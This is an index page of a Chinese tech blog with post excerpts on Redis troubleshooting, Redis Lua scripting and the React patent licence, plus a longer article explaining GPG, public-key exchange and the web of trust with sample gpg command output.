<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">
<meta name="baidu-site-verification" content="codeva-HZoIBm8yNp" />
<meta name="bytedance-verification-code" content="xa6iZeY+/XCOJvarHaDY" />








<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Liunx Python Rust Goalng DevOPS" />










<meta name="description" content="个人随想，瞎子的世界. Linux Python Rust React Nextjs are my love.">
<meta property="og:type" content="website">
<meta property="og:title" content="逐流小站">
<meta property="og:url" content="https://blog.feedscoin.com/page/39/index.html">
<meta property="og:site_name" content="逐流小站">
<meta property="og:description" content="个人随想，瞎子的世界. Linux Python Rust React Nextjs are my love.">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Laird Lau">
<meta property="article:tag" content="Liunx Python Rust Goalng DevOPS">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://blog.feedscoin.com/page/39/"/>





  <title>逐流小站</title>
  





<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-MW47YH6RH0"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-MW47YH6RH0');
</script>





<meta name="generator" content="Hexo 7.0.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">逐流小站</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">想回到那个能随便跳槽的年代</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            Sitemap
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/09/record-question-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/record-question-1/" itemprop="url">记录 — Redis与接口签名问题</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-21T05:09:59+00:00">
                2017-09-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/DB/" itemprop="url" rel="index">
                    <span itemprop="name">DB</span>
                  </a>
                </span>

                
                
                  , 
                

              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/DB/Redis/" itemprop="url" rel="index">
                    <span itemprop="name">Redis</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>最近比较忙，要上新的项目，也没时间打理博客了。今天中午抽午睡时间记录下这几天工作上遇到的 <a href="#">接口签名错误</a> 和 <a href="#">Redis 集群 VIP 漂移故障</a> 。</p>
<p><img src="//www.fanhaobai.com/2017/09/record-question-1/0188ae67-31cc-464e-a986-d999f3507427.png">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/09/record-question-1/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/%E4%BB%8EReact%E4%B8%93%E5%88%A9%E4%BA%8B%E4%BB%B6%E7%9C%8B%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E8%AE%B8%E5%8F%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/%E4%BB%8EReact%E4%B8%93%E5%88%A9%E4%BA%8B%E4%BB%B6%E7%9C%8B%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E8%AE%B8%E5%8F%AF/" itemprop="url">从 React 专利事件看开源软件许可</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-20T15:06:45+00:00">
                2017-09-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%94%9F%E6%B4%BB%E6%84%9F%E6%82%9F/" itemprop="url" rel="index">
                    <span itemprop="name">生活感悟</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          实际上在 React 为前端带来虚拟 DOM、单向数据流和不可变对象等一系列函数式编程的概念的同时，Facebook 在开源社区中的话语权同样越来越大，Facebook 在开源协议中夹藏私货的确让人有种"挟天子以令诸侯"的感觉，曾几何时，社区指责微软没有开放全部的 OpenXML 标准，因为大家都觉得按照这个标准实现的 Office 文档和微软家的存在差异，可是面对这种和自家产品紧密联系的项目要开源，我觉得这不单是 Facebook 会有所提防，恐怕所有的商业公司都会有类似的想法吧，所以在这个事件中，隐含的一个点就是，一旦当使用 React 的公司和 Facebook 发生业务上的竞争，React 将成为 Facebook 获得诉讼胜利的一个重要筹码，因为根据 React 的专利协议，Facebook 有权在开展诉讼时从被授权方手中收回 React 的使用权，所以我们不难理解为什么百度和 Wordpress 都宣称要停止使用 React，除了不想受制于人以外，像百度这种未来可能会和 Facebook 在 AI 等领域发生竞争的公司，宁可自己造一套轮子而不愿让自家专利被对方使用的做法，我觉得是可以理解的;或许在数日前，你还在为 React 专利事件而苦恼，或者考虑在 Preact 的基础上实现一个新的 React，或者考虑转向 Angular 和 Vue 这两个框架，此时此刻 Facebook 宣布将 React 的开源协议修改为 MIT，或许这算是开源社区的一次胜利，或许这算是整个专利事件的尘埃落定，或许有人继续担心 Facebook 搞其他事情，可是这个世界原本就是在每天都发生变化着的，对于未来我们常常是无从得知它的足迹会在哪里;所以这篇文章我想和大家通过 React 专利事件来聊聊开源软件许可，以及我们如何在商业化和开源社区间找到一个平衡点
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/%E4%BB%8EReact%E4%B8%93%E5%88%A9%E4%BA%8B%E4%BB%B6%E7%9C%8B%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E8%AE%B8%E5%8F%AF/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/Redis%E7%BC%93%E5%AD%98%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8BLua%E8%84%9A%E6%9C%AC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/Redis%E7%BC%93%E5%AD%98%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8BLua%E8%84%9A%E6%9C%AC/" itemprop="url">Redis 缓存技术学习系列之 Lua 脚本</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-17T02:49:07+00:00">
                2017-09-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/" itemprop="url" rel="index">
                    <span itemprop="name">数据存储</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          好了，现在大家应该理解 EVAL 这个命令的使用方法啦，那么对 EVALSHA 命令来说，顾名思义，它就是使用了 SHA1 验证的 EVAL 方法，我们注意到现在脚本都是定义在 EVAL 命令的第一个参数上，假如我们需要复用一个脚本，而该脚本可以为我们提供 Sum 这样的功能，即它可以返回一组参数的和给我们，显然参数的个数是不同的，那么这个时候我们总不能每次都重复写这个脚本吧，所以 Redis 会为脚本创建一个指纹，我们使用 EVALSHA 命令来传入一个指纹，Redis 将从缓存的脚本中找到这个脚本，并结合我们的参数来调用它，这样我们就可以获得脚本执行以后的结果，关于指纹的这种说法，大家可以结合 Git 提交代码时的感受进行理解，除此以外，它和 EVAL 在使用方法上是完全一致的，所以不再举例子说明啦;尤其当我面试的时候，我发现好多我写在简历上的内容，都会成为某种意义上的呈堂证供，这让我更加确信好多东西需要不断地去巩固，所以尝试在实际项目上使用 Moq、考虑怎么写出更好的测试方法以及时刻保持自我的不可替代性，这些都是我最近在考虑的事情，有时候发脾气是因为觉得自己在浪费生命，可越是被这种无力感笼罩的时候，就越是要对自己狠一点儿，所以在这篇博客中，让我们重新拾起对 Redis 的学习兴趣，今天我们来说说 Redis 中的 Lua 脚本;好了，我们下面来解释下这段脚本，我们向 Redis 中键名为**data**的集合中添加了 5 个元素，注意这句脚本是在执行**src/redis-cli**后执行的，这部分内容我们在前面讲解 Redis 中的数据结构的时候提到过，博主表示在写这篇文章的时候依然要去看文档，总之现在我们有一个集合，并且这个集合中有 5 个元素，与此同时呢，我们编写了一个 Lua 脚本文件**script01.lua**，这个脚本的作用是对集合中的元素进行求和
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/Redis%E7%BC%93%E5%AD%98%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8BLua%E8%84%9A%E6%9C%AC/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/2017-09-12-gpg-and-e2ee/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/2017-09-12-gpg-and-e2ee/" itemprop="url">GPG 与端到端加密：论什么才是可以信任的</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-11T16:00:00+00:00">
                2017-09-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <blockquote>
<p>本文由我去年 6 月在 LeanCloud 的一次技术分享整理而来，需要读者对公钥加密算法有基本的了解。</p>
</blockquote>
<p>如果提到 GPG 那么不得不提的就是公钥加密算法，首先我们先来快速地了解一下最知名的公钥加密算法 —— RSA：在 RSA 中有「公钥」和「私钥」两种密钥，其中私钥可以导出公钥，但公钥无法反推私钥。如果用公钥加密数据的话，那么只有私钥可以解密；如果使用私钥签名数据的话，那么可以验签名。</p>
<p><img src="https://r2-lc-cn.jysperm.me/thirdparty/gpg-public-key-encryption.gif"></p>
<h2 id="密码学账户"><a href="#密码学账户" class="headerlink" title="密码学账户"></a>密码学账户</h2><p>顾名思义，通常我们会将公钥公开地发布，作为自己身份的代表，就好像用户名一样（虽然是一个难以记忆的随机字符串）；而将私钥秘密地保存，作为身份的证明，就像密码一样。如果一个账户是由一个公钥加密算法的密钥对所保护的，那我们称之为「密码学账户」，我们身边常见的密码学账户包括：</p>
<ul>
<li>SSL 证书（用于 HTTPS 等加密通讯）</li>
<li>S&#x2F;MIME 证书（用于邮件加密和认证）</li>
<li>SSH 密钥（用于登录服务器的凭证）</li>
<li>Bitcoin 钱包</li>
<li>GPG ID</li>
</ul>
<p>这些账户和我们通常注册的互联网服务很不一样，在我们通常注册的互联网服务中，你的账户实际上是由网站的维护者管理的，你为账户设置的密码并没有真的用来加密数据，而只是一种证明账户所有权的凭证，在每次登录时你向网站发送密码，来证明自己是账户的所有者。一旦你忘记了密码，网站的维护者在通过其他渠道（邮箱地址、手机号码）确认了你的身份之后，也可以帮助你重置密码。</p>
<p>而在密码学账户中，你拥有账户的唯一凭证就是你的密钥对 —— 通常是计算机上的一个文件，你通过使用这个密钥对进行签名来管理你的账户、进行解密来访问机密数据。密码学账户既是更加安全的（不存在具有特权的管理者），同时也是更加危险的（一旦丢失无法找回；一旦泄漏也无法重置）。</p>
<h2 id="公钥交换"><a href="#公钥交换" class="headerlink" title="公钥交换"></a>公钥交换</h2><p>公钥加密算法看上去很美好，一旦我们有了对方的公钥，只需在通讯时用对方的公钥加密数据，就万无一失了，但这其中 <strong>最薄弱的一个环节就是「得到对方的公钥」，即「公钥交换」</strong>。</p>
<p><img src="https://r2-lc-cn.jysperm.me/pictures/2017/exchange.png"></p>
<p>上图是理想的情况，A 和 B 互相之间交换公钥，后续的通讯就可以以加密的方式进行了。但如果这时出现了一个能够监听和篡改 A 和 B 之间的通讯的 C，然后将自己的公钥发给 A 和 B，就变成了这样：</p>
<p><img src="https://r2-lc-cn.jysperm.me/pictures/2017/mitm.png"></p>
<p>A 和 B 都以为自己得到了对方的公钥，但实际上他们得到的都是中间人 C 的公钥，这意味着他们之后的通讯都会以 C 的公钥来加密，C 便可以在中间继续进行窃听和篡改。</p>
<p>所以在理论上 <strong>不可能存在一种在线的、可靠的、不事先协商的公钥交换机制</strong>，因为交换公钥意味着双方还没有开始加密通讯，交换的过程自然没有保障。那么在实际应用中我们是如何解决公钥交换的问题的呢，我们来看一下 SSL 所使用的 X.509 证书体系：</p>
<p><img src="https://r2-lc-cn.jysperm.me/pictures/2017/x509.png"></p>
<p>在 X.509 中有一个被称为「证书颁发机构（CA）」的权威的第三方，CA 的数量较为有限，资格变化也并不频繁，所有浏览器（browser）都内置了 CA 的公钥。而网站方（website）在生成了自己的公钥后，需要先找 CA 对自己的公钥进行签名然后才能使用。当浏览器访问一个新的网站时，网站方需要提供经过 CA 签名的公钥，浏览器使用内置的 CA 公钥来验证签名，确保收到的网站的公钥没有被篡改过。</p>
<p>X.509 实际上就是要求大家信任一个权威的第三方并将它们的公钥内置在客户端中，这并不是一个完美的方案，因为在这个体系中 CA 有着非常大的权力，一旦 CA 不按照规则签发证书，那么客户端是无法察觉这种攻击行为的。</p>
<h2 id="GPG"><a href="#GPG" class="headerlink" title="GPG"></a>GPG</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://gnupg.org/">GPG</a> 是 PGP（Pretty Good Privacy）的一个 GPL 实现，也是目前使用最广泛的实现。</p>
</blockquote>
<p>「信任一个权威的第三方」对于一些去中心化爱好者是无法接受的：首先我们凭什么去信任这个第三方，其次在 CA 申领证书通常也是需要付费的。那么有没有可能去除这个权威的第三方，而允许大家互相进行认证呢？如何确认一个公钥就是属于这个人的呢？这就是我们接下来要介绍的 GPG 的信任模型：</p>
<p><img src="https://r2-lc-cn.jysperm.me/pictures/2017/gpg-trust-model.png"></p>
<p>在 GPG 的信任模型中，用户互相之间对公钥进行认证（通过用自己的私钥进行签名的方式），例如 Alice 和 Bob 是很好的朋友，要么 Alice 就会用自己私钥给 Bob 的公钥签名，然后将这个签名通过 Key Server 广播给其他人。Key Server 仅仅用来交换公钥和签名，因为签名本身是可校验的，所以 Key Server 并没有任何特权。</p>
<p>当另外一个 Alice 的朋友看到 Bob 的公钥，并且发现 Alice 给 Bob 的公钥签过名，那么就可以认为他的朋友 Alice 已经检查过 Bob 的公钥了，如果看到更多朋友给 Bob 签过名，那么就几乎可以认定 Bob 的身份是真实的。</p>
<p>所以 GPG 实际上是一个由「熟人关系」建立起的信任网络，当你认可一个人的身份，即认可这个公钥是属于这个人的，你便可以给他的公钥进行签名，形成一种信任关系，同时这种信任关系又是可以传递的。当你的 GPG 通讯录中有了一些互相信任的朋友之后，便可基于这个关系网来拓展你的朋友圈。</p>
<p>那么既然我们前面提到不可能有一个在线的、可靠的、不事先协商的公钥交换机制，那么这个信任网络在一开始是如何建立起来的呢？答案是使用分散的、多渠道的、可能是线下的方式来交换和确认公钥。如果使用一个固定的协议去交换公钥，而且这个协议本身没有加密保护，那么当然容易被中间人攻击，但如果两个人同时使用多种渠道来交换公钥，例如先用邮件发一次、再用微信发一次、最后再用电话说一次，那么这些渠道同时被攻击的可能性会非常小。</p>
<p>或者更进一步，我们可以采用线下的方式来进行确认，实际上很多技术类会议结束后可能会有一个 Key Signing Party 的活动，大家面对面地确认身份（你可能有必要出示印有照片的证件，例如身份证或护照），用纸和笔记下公钥，然后回家进行签名和上传。</p>
<p><img src="https://r2-lc-cn.jysperm.me/thirdparty/gpg-key-signing-party.jpg"></p>
<p>最后你便得到了一些来自其他人签名，代表他们认可了你的身份，即认可了某一个 GPG 公钥代表了你。</p>
<h2 id="GPG-通讯簿"><a href="#GPG-通讯簿" class="headerlink" title="GPG 通讯簿"></a>GPG 通讯簿</h2><p>因为 GPG 需要用户自己维护信任关系，因此每个 GPG 的用户都会有一个通讯簿，里面是大量的公钥（代表着一个其他用户）和签名（代表着信任关系）。</p>
<p>下面是我的通讯录中与我自己相关的部分：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~&gt; gpg --list-keys jysperm</span><br><span class="line">pub   4096R/E466CF1E 2014-11-23 [expires: 2017-05-17]</span><br><span class="line">uid       [ultimate] Wang Ziting &lt;jysperm@gmail.com&gt;</span><br><span class="line">uid       [ultimate] Wang Ziting &lt;jysperm@icloud.com&gt;</span><br><span class="line">uid       [ultimate] [jpeg image of size 1476]</span><br><span class="line">sub   2048R/1D795875 2014-11-23 [expires: 2017-05-17]</span><br><span class="line">sub   2048R/289286B3 2014-11-23 [expires: 2017-05-17]</span><br><span class="line">sub   2048R/35B5DE4D 2016-05-17 [expires: 2017-05-17]</span><br></pre></td></tr></table></figure>

<p>其中 <code>E466CF1E</code> 是我的「根公钥」的简写形式，<code>4096R</code> 表示这是一个 4096 bit 的 RSA 密钥对，创建时间是 <code>2014-11-23</code>，有效期至 <code>2017-05-17</code>。一个 GPG 帐号下可以有多个 uid，我可以使用根公钥签署类似于「<a href="mailto:&#106;&#x79;&#115;&#x70;&#101;&#x72;&#x6d;&#64;&#103;&#109;&#x61;&#105;&#x6c;&#46;&#99;&#111;&#109;">&#106;&#x79;&#115;&#x70;&#101;&#x72;&#x6d;&#64;&#103;&#109;&#x61;&#105;&#x6c;&#46;&#99;&#111;&#109;</a> 是我的邮箱地址」的签名，来将自己的多个身份关联到一起，上面的 3 个 uid 即我的 2 个邮箱地址和一个头像图片。</p>
<p>我还可以使用根公钥签署一个类似于「我授权 1D795875 为我的子密钥，可以代替我进行签名等操作」的消息来添加额外的子密钥，例如上面的三个 <code>sub</code> 就是三个不同功能的子密钥。就像这样，其实对于 GPG 帐号的管理操作都是通过用私钥签名消息来实现的。</p>
<p>还可以列出与我有关的签名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~&gt; gpg --list-sigs jysperm</span><br><span class="line">pub   4096R/E466CF1E 2014-11-23 [expires: 2017-05-17]</span><br><span class="line">uid                  Wang Ziting &lt;jysperm@gmail.com&gt;</span><br><span class="line">sig          C07CFB96 2016-05-04  paomian &lt;qtang@leancloud.rocks&gt;</span><br><span class="line">sig 3        7CDC82A7 2015-05-11  Yeechan Lu &lt;wz.bluesnow@gmail.com&gt;</span><br><span class="line">sig 3        E466CF1E 2016-05-17  Wang Ziting &lt;jysperm@gmail.com&gt;</span><br><span class="line">sig          E411E711 2016-06-02  keybase.io/librazy &lt;librazy@keybase.io&gt;</span><br><span class="line">sig          B0B002B8 2016-07-13  dennis (Dennis Zhuang) &lt;killme2008@gmail.com&gt;</span><br></pre></td></tr></table></figure>

<p>这里看到除了我自己之外，还有其他四个人为我 <code>jysperm@gmail.com</code> 这个 uid 进行了签名，认可了 <code>E466CF1E</code> 这个公钥属于 <code>Wang Ziting &lt;jysperm@gmail.com&gt;</code> 这个人。对他人的签名也是可以区分不同的级别的，例如对于「在论坛上混了个脸属」和「每天都见面的同事」你可以给予不同级别的签名来更准确地表达信任关系</p>
<h2 id="使用-GPG"><a href="#使用-GPG" class="headerlink" title="使用 GPG"></a>使用 GPG</h2><p>前面我们介绍了 GPG 的信任模型和通讯簿，那么可以在哪些场景下使用 GPG 呢？</p>
<p>首先是你可以用它签名一段消息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">~&gt; echo &#x27;hello&#x27; | gpg --clearsign -a</span><br><span class="line">-----BEGIN PGP SIGNED MESSAGE-----</span><br><span class="line">Hash: SHA1</span><br><span class="line"></span><br><span class="line">hello</span><br><span class="line">-----BEGIN PGP SIGNATURE-----</span><br><span class="line"></span><br><span class="line">iQIcBAEBAgAGBQJXfifAAAoJELQPOvDkZs8epZAP/3/jP6k1Dev2a8i8KfY7VDfv</span><br><span class="line">TVGl61kLEbgpgR3mWXFL7PaJ8SyW8N0Dv3cJhYbY8NGp8wbkZa7cUS7DkTb2ArhS</span><br><span class="line">M+IKUJtwUwbfp5fOyT+esaDLWatqjSJ+5IjWX8BOnh5SnLNMURDxsYrJMShfecTD</span><br><span class="line">tbBfnEkIeCFBwIfE0Xs5m23+6i7t77ZgLdn1qpWLTRNpd6Fzi0B653Kr8dREPflI</span><br><span 